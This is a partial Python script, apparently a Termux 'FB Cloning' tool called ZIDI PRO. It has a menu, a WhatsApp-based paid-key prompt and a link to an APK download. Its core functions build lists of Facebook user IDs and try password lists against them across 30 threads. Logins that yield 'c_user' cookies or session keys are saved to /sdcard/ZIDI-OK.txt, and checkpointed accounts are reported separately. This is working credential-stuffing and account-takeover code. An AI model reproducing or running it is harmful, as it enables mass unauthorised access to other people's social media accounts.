...
logo=("""\033[1;37m
  8888888888P 8888888 8888888b. 8888888 
  ...
  d8888888888 8888888 8888888P" 8888888 \033[1;34m 𝐏\033[1;31m 𝐑\033[1;35m 𝐎\033[1;37m
----------------------------------------------
 Owner     : Arshii ZiDi
 Type type : FB CloninG
 Status    :  Trial
 Version   :  0.5
----------------------------------------------
 ZIDI PRO VERSION  0.5
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if PRO in ['1','01']:
                                ...
                                wx=('Gx56kxJA4Bh0EcBtRLnwD6')
                                os.system(f'xdg-open https://chat.whatsapp.com/{wx}');menu()
                        elif PRO in ['6','06']:
                                wx=('Gx56kxJA4Bh0EcBtRLnwD6')
                                os.system(f'xdg-open https://chat.whatsapp.com/{wx}');menu()
                        elif PRO in ['7','07']:
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/ZIDI_VPN1.0.apk/file');menu()
                        elif PRO in ['8','08']:
                                os.system('');menu()
                        elif PRO in ['0','00']:
                                exit(' Thanks for Use ZiDi Pro TOOL 🥰 ')
                        else:
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=03497540669&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi ZIDI Sir, I Need To Buy Your Paid ZIDI PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python ZIDI.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as PRO:     
                        clear()
                        tl = str(len(user))
...
def gmail():
                ...
                clear()
                print('\033[1;37m example: Arshad, Hassan, Faizan, Rashid\033[1;97m')
                linex()
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [ZIDI-PRO] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        PRO=session.cookies.get_dict().keys()
                        if "c_user" in PRO:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [ZIDI-OK] %s | %s'%(ids,pas))
                                open('/sdcard/ZIDI-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in PRO:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [ZIDI-CP] '+ids+' | '+pas+'\033[1;97m')
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/ZIDI-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [ZIDI-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/ZIDI-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [ZIDI-OK] '+uid+' | '+pas+'\033[1;97m')
